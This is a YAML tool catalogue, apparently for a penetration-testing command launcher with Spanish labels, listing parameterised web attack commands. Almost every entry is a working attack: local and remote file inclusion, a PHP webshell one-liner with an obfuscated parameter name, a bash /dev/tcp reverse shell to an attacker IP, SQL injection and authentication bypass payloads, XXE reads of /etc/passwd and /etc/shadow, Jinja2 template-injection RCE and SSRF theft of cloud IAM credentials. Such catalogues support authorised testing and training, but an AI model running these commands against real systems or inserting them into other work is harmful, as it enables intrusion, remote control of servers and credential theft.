tools:
  - id: lfi_basic
    name: "LFI - Local File Inclusion"
    description: "Prueba LFI en parametro de URL para leer ficheros del servidor"
    command: "curl -s 'http://{target}/{path}?{param}={payload}'"
    params:
      - name: target
        label: "Target (IP:Puerto)"
        placeholder: "192.168.50.16"
        required: true
      - name: path
        label: "Path de la app"
        placeholder: "index.php"
        required: true
      - name: param
        label: "Parametro vulnerable"
        placeholder: "page"
        required: true
      - name: payload
        label: "Payload LFI"
        placeholder: "../../../etc/passwd"
        default: "../../../etc/passwd"
    tags: [web, lfi, file-inclusion, linux]
    notes: "Probar: ../../../../etc/shadow, /proc/self/environ, /var/log/apache2/access.log"
  - id: php_filter_b64
    name: "LFI - PHP Wrapper (leer codigo fuente)"
    description: "Usa PHP filter wrapper para leer codigo fuente de ficheros PHP en base64"
    command: "curl -s 'http://{target}/{path}?{param}=php://filter/convert.base64-encode/resource={file}' | base64 -d"
    params:
      - name: target
        label: "Target"
        placeholder: "192.168.50.16"
        required: true
      - name: path
        label: "Path"
        placeholder: "index.php"
        required: true
      - name: param
        label: "Parametro LFI"
        placeholder: "page"
        required: true
      - name: file
        label: "Fichero a leer"
        placeholder: "config.php"
        required: true
    tags: [web, lfi, php, wrapper, source-code]
  - id: rfi_basic
    name: "RFI - Remote File Inclusion"
    description: "Incluye un fichero PHP malicioso desde servidor remoto para RCE"
    command: "curl -s 'http://{target}/{path}?{param}=http://{lhost}/shell.php&cmd=id'"
    params:
      - name: target
        label: "Target"
        placeholder: "192.168.50.16"
        required: true
      - name: path
        label: "Path vulnerable"
        placeholder: "index.php"
        required: true
      - name: param
        label: "Parametro RFI"
        placeholder: "page"
        required: true
      - name: lhost
        label: "IP atacante con HTTP server"
        placeholder: "10.10.14.1"
        required: true
    tags: [web, rfi, remote-inclusion, rce, php]
    notes: "En Kali: echo shell.php y python3 -m http.server 80"
  - id: file_upload_webshell
    name: "File Upload - Webshell PHP"
    description: "Sube una webshell PHP a traves de funcionalidad de upload vulnerable"
    command: "curl -X POST 'http://{target}/{upload_path}' -F 'file=@shell.php'"
    params:
      - name: target
        label: "Target"
        placeholder: "192.168.50.16"
        required: true
      - name: upload_path
        label: "Endpoint de upload"
        placeholder: "/upload.php"
        required: true
    tags: [web, file-upload, webshell, php, rce]
    notes: "Crear shell.php: echo '<?php system($_REQUEST[chr(99).chr(109).chr(100)]); ?>' > shell.php. Bypasses: .phtml .php5 .phar"
  - id: cmd_injection
    name: "Command Injection - Deteccion"
    description: "Prueba de inyeccion de comandos OS en parametros web"
    command: "curl -s 'http://{target}/{path}?{param}=127.0.0.1%3Bid'"
    params:
      - name: target
        label: "Target"
        placeholder: "192.168.50.16"
        required: true
      - name: path
        label: "Path vulnerable"
        placeholder: "ping.php"
        required: true
      - name: param
        label: "Parametro vulnerable"
        placeholder: "ip"
        required: true
    tags: [web, command-injection, rce, os]
    notes: "Payloads: 127.0.0.1;id | &&id | |id | $(id). ; = %3B, | = %7C, & = %26"
  - id: sqli_auth_bypass
    name: "SQLi - Bypass Autenticacion"
    description: "Payloads SQLi para bypassear formularios de login"
    command: "curl -X POST 'http://{target}/{login_path}' -d 'username=admin%27--&password=x'"
    params:
      - name: target
        label: "Target"
        placeholder: "192.168.50.16"
        required: true
      - name: login_path
        label: "Path del login"
        placeholder: "/login"
        required: true
    tags: [web, sqli, auth-bypass, login]
    notes: "Payloads en campo usuario: ' OR '1'='1 | admin'-- | ' OR 1=1 -- | admin' #"
  - id: sqli_union_cols
    name: "SQLi - UNION Detectar columnas"
    description: "Determina el numero de columnas para inyeccion UNION-based con ORDER BY"
    command: "curl -s 'http://{target}/{path}?{param}=1 ORDER BY {num}--'"
    params:
      - name: target
        label: "Target"
        placeholder: "192.168.50.16"
        required: true
      - name: path
        label: "Path"
        placeholder: "item.php"
        required: true
      - name: param
        label: "Parametro vulnerable"
        placeholder: "id"
        required: true
      - name: num
        label: "Numero de columna a probar"
        placeholder: "1"
        required: true
    tags: [web, sqli, union, columns, manual]
    notes: "Incrementar hasta error = N-1 columnas. Alternativa: UNION SELECT NULL,NULL--"
  - id: sqli_blind_time
    name: "SQLi - Blind Time-Based"
    description: "SQLi ciega basada en tiempo cuando no hay salida visible"
    command: "curl -s -o /dev/null -w '%{time_total}' 'http://{target}/{path}?{param}=1 AND SLEEP(5)--'"
    params:
      - name: target
        label: "Target"
        placeholder: "192.168.50.16"
        required: true
      - name: path
        label: "Path"
        placeholder: "item.php"
        required: true
      - name: param
        label: "Parametro"
        placeholder: "id"
        required: true
    tags: [web, sqli, blind, time-based]
    notes: "MySQL: SLEEP(5) | PostgreSQL: pg_sleep(5) | MSSQL: WAITFOR DELAY '0:0:5'"
  - id: sqlmap_url
    name: "SQLMap - GET Parameter"
    description: "Deteccion y explotacion automatica de SQLi en parametro GET"
    command: "sqlmap -u 'http://{target}/{path}?{param}=1' --dbs --batch --level 3 --risk 2"
    params:
      - name: target
        label: "Target"
        placeholder: "192.168.50.16"
        required: true
      - name: path
        label: "Path"
        placeholder: "item.php"
        required: true
      - name: param
        label: "Parametro GET"
        placeholder: "id"
        required: true
    tags: [web, sqli, sqlmap, automated]
  - id: sqlmap_request
    name: "SQLMap - Request Burp"
    description: "SQLMap con fichero de peticion HTTP exportado de Burp Suite"
    command: "sqlmap -r {request_file} --dbs --batch --level 3"
    params:
      - name: request_file
        label: "Fichero de peticion (de Burp)"
        placeholder: "request.txt"
        required: true
    tags: [web, sqli, sqlmap, burp, post]
  - id: xxe_basic
    name: "XXE - XML External Entity"
    description: "Payload XXE para leer ficheros del servidor en endpoints que parsean XML"
    command: "curl -X POST 'http://{target}/{path}' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>'"
    params:
      - name: target
        label: "Target"
        placeholder: "192.168.50.16"
        required: true
      - name: path
        label: "Endpoint XML"
        placeholder: "/api/upload"
        required: true
    tags: [web, xxe, xml, file-read]
    notes: "Targets: /etc/passwd, /etc/shadow, /proc/self/environ, ficheros config."
  - id: web_reverse_shell
    name: "Reverse Shell desde Webshell"
    description: "Obtiene reverse shell desde ejecucion de codigo en servidor web"
    command: "curl 'http://{target}/{shell_path}?cmd=bash%20-c%20%27bash%20-i%20>%26%20/dev/tcp/{lhost}/{lport}%200>%261%27'"
    params:
      - name: target
        label: "Target"
        placeholder: "192.168.50.16"
        required: true
      - name: shell_path
        label: "Ruta de la webshell"
        placeholder: "/uploads/shell.php"
        required: true
      - name: lhost
        label: "IP atacante"
        placeholder: "10.10.14.1"
        required: true
      - name: lport
        label: "Puerto listener"
        placeholder: "4444"
        default: "4444"
    tags: [web, reverse-shell, webshell, rce]
    notes: "Primero abrir listener: nc -nvlp {lport}"
  - id: burp_proxy
    name: "Burp Suite - Proxy curl"
    description: "Configura curl para usar Burp Suite como proxy interceptor"
    command: "curl --proxy http://127.0.0.1:8080 -k 'https://{target}/{path}'"
    params:
      - name: target
        label: "Target"
        placeholder: "192.168.50.16"
        required: true
      - name: path
        label: "Path"
        placeholder: "/"
        required: true
    tags: [web, burp, proxy, intercept]
    notes: "Burp activo en 127.0.0.1:8080. Instalar certificado CA en el browser."

  # ─────────────────────────────────────────────
  # MODERN WEB ATTACKS (2023-2024)
  # ─────────────────────────────────────────────

  - id: graphql_introspection
    name: "GraphQL - Introspección + Enum"
    description: "Descubre el schema completo de GraphQL via introspección"
    command: "for path in /graphql /api/graphql /v1/graphql /graphiql /playground; do CODE=$(curl -sk -o /dev/null -w '%{http_code}' 'http://{target}$path' 2>/dev/null); [ \"$CODE\" != '404' ] && echo \"GraphQL en $path: $CODE\" && curl -sk -X POST 'http://{target}$path' -H 'Content-Type: application/json' -d '{\"query\":\"{ __schema { types { name } } }\"}' 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); types=[t[\"name\"] for t in d.get(\"data\",{}).get(\"__schema\",{}).get(\"types\",[])]; [print(t) for t in types if not t.startswith(\"__\")][:10]' 2>/dev/null; done"
    params:
      - name: target
        label: "Target IP:Port"
        placeholder: "10.10.10.10:3000"
        required: true
    tags: [graphql, introspection, api, web]
    notes: "Si introspección activa → buscar mutaciones de auth, IDOR en queries, injection."

  - id: spring_actuator_scan
    name: "Spring Boot Actuator - Scan"
    description: "Descubre endpoints de Spring Boot Actuator expuestos"
    command: "for ep in actuator actuator/env actuator/beans actuator/heapdump actuator/mappings actuator/loggers actuator/info actuator/httptrace actuator/health; do CODE=$(curl -sk -o /dev/null -w '%{http_code}' 'http://{target}/$ep' 2>/dev/null); [ \"$CODE\" = '200' ] && echo \"EXPOSED: /$ep\" && curl -sk 'http://{target}/$ep' 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); [print(k,str(v)[:80]) for k,v in d.items() if any(s in str(k).lower() for s in [\"pass\",\"secret\",\"key\",\"token\",\"cred\",\"db\"])]' 2>/dev/null | head -5; done"
    params:
      - name: target
        label: "Target IP:Port"
        placeholder: "10.10.10.10:8080"
        required: true
    tags: [spring-boot, actuator, web, misconfiguration]
    notes: "/actuator/env puede exponer DB_PASSWORD, API keys, etc. /actuator/heapdump para memory dump."

  - id: cors_misconfiguration_check
    name: "CORS Misconfiguration Check"
    description: "Verifica si la app tiene configuración CORS insegura"
    command: "curl -sk -H 'Origin: https://evil.com' -I 'http://{target}' 2>/dev/null | grep -i 'access-control'; echo '---'; curl -sk -H 'Origin: null' -I 'http://{target}' 2>/dev/null | grep -i 'access-control'; echo '---'; curl -sk -H 'Origin: https://{target}.evil.com' -I 'http://{target}' 2>/dev/null | grep -i 'access-control'"
    params:
      - name: target
        label: "Target IP:Port"
        placeholder: "10.10.10.10"
        required: true
    tags: [cors, web, misconfiguration, headers]
    notes: "Si Access-Control-Allow-Origin: * + Allow-Credentials: true → crítico. Si refleja Origin evil.com → alto."

  - id: jwt_tool_attacks
    name: "JWT Tool - Bypass/Crack"
    description: "Analiza y ataca tokens JWT (alg:none, RS→HS256, brute)"
    command: "python3 /opt/jwt_tool/jwt_tool.py {jwt} -t 'http://{target}' -rh 'Authorization: Bearer JWTTOOL_TOKEN' -M at 2>/dev/null | head -20"
    params:
      - name: jwt
        label: "JWT token"
        placeholder: "eyJhbGciOiJIUzI1NiJ9..."
        required: true
      - name: target
        label: "Target URL"
        placeholder: "http://10.10.10.10"
        required: true
    tags: [jwt, bypass, brute, web]
    notes: "Instalar: git clone https://github.com/ticarpi/jwt_tool. Opciones: -X a (alg:none), -X s (RS→HS256), -C -d rockyou.txt (brute)"

  - id: open_redirect_check
    name: "Open Redirect Check"
    description: "Detecta open redirects en parámetros de URL comunes"
    command: "for param in redirect next url return returnTo goto dest destination r redir; do LOC=$(curl -sk -o /dev/null -w '%{redirect_url}' 'http://{target}/?'$param'=https://evil.com' 2>/dev/null); echo \"$LOC\" | grep -q 'evil.com' && echo \"OPEN_REDIRECT: ?$param=https://evil.com → $LOC\"; done"
    params:
      - name: target
        label: "Target IP:Port"
        placeholder: "10.10.10.10"
        required: true
    tags: [open-redirect, web, owasp]
    notes: "Usable para OAuth token stealing: redirect_uri=https://evil.com/callback en flujo OAuth."

  - id: ssrf_cloud_metadata
    name: "SSRF - Cloud Metadata Check"
    description: "Verifica si hay SSRF via parámetros de URL apuntando al IMDS"
    command: "for param in url redirect next fetch load proxy callback src image target uri; do R=$(curl -sk 'http://{target}/?'$param'=http://169.254.169.254/latest/meta-data/' 2>/dev/null | head -5); [ -n \"$R\" ] && echo \"SSRF POSSIBLE: ?$param=http://169.254.169.254\" && echo \"$R\" | head -3 && break; done"
    params:
      - name: target
        label: "Target IP:Port"
        placeholder: "10.10.10.10"
        required: true
    tags: [ssrf, cloud, aws, metadata, web]
    notes: "Si responde → GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ para credenciales IAM."

  - id: prototype_pollution_check
    name: "Prototype Pollution Check"
    description: "Detecta prototype pollution en apps Node.js"
    command: "for payload in '__proto__[test]=polluted' 'constructor[prototype][test]=polluted' '__proto__.test=polluted'; do R=$(curl -sk -X POST 'http://{target}/api' -H 'Content-Type: application/json' -d '{\"'$payload'\": 1}' 2>/dev/null); echo \"Payload: $payload → $(echo $R | head -c 50)\"; done"
    params:
      - name: target
        label: "Target IP:Port/Path"
        placeholder: "10.10.10.10"
        required: true
    tags: [prototype-pollution, nodejs, javascript, web]
    notes: "Si la respuesta cambia o da error 500 → posible prototype pollution. Verificar isAdmin bypass."

  - id: ssti_payloads
    name: "SSTI - Server Side Template Injection"
    description: "Detecta y explota SSTI en frameworks comunes (Jinja2, Twig, FreeMarker)"
    command: "for payload in '{{7*7}}' '${7*7}' '<%= 7*7 %>' '#{7*7}' '*{7*7}'; do R=$(curl -sk 'http://{target}/?name='$(python3 -c 'import urllib.parse; print(urllib.parse.quote(\"'$payload'\"))') 2>/dev/null); echo \"$R\" | grep -q '49' && echo \"SSTI CONFIRMED: $payload\" && break; done; # RCE Jinja2\ncurl -sk \"http://{target}/?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}\" 2>/dev/null | grep uid="
    params:
      - name: target
        label: "Target IP:Port/Path"
        placeholder: "10.10.10.10/search"
        required: true
    tags: [ssti, template-injection, rce, web, jinja2]
    notes: "Si {{7*7}} → 49 = Jinja2/Twig. Para RCE Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}"

  - id: http_request_smuggling
    name: "HTTP Request Smuggling Check"
    description: "Detecta HTTP Request Smuggling (CL.TE y TE.CL)"
    command: "# CL.TE check\ncurl -sk 'http://{target}/' -X POST -H 'Content-Length: 13' -H 'Transfer-Encoding: chunked' -d '0\r\n\r\nSMUGGLED' 2>/dev/null | head -5; # Use smuggler.py for full detection\npython3 /opt/smuggler/smuggler.py -u 'http://{target}/' 2>/dev/null | head -20 || echo 'Install smuggler: git clone https://github.com/defparam/smuggler'"
    params:
      - name: target
        label: "Target IP:Port"
        placeholder: "10.10.10.10"
        required: true
    tags: [http-smuggling, cl-te, te-cl, web, owasp]
    notes: "Instalar smuggler: git clone https://github.com/defparam/smuggler. Muy impactante en apps detrás de proxy."
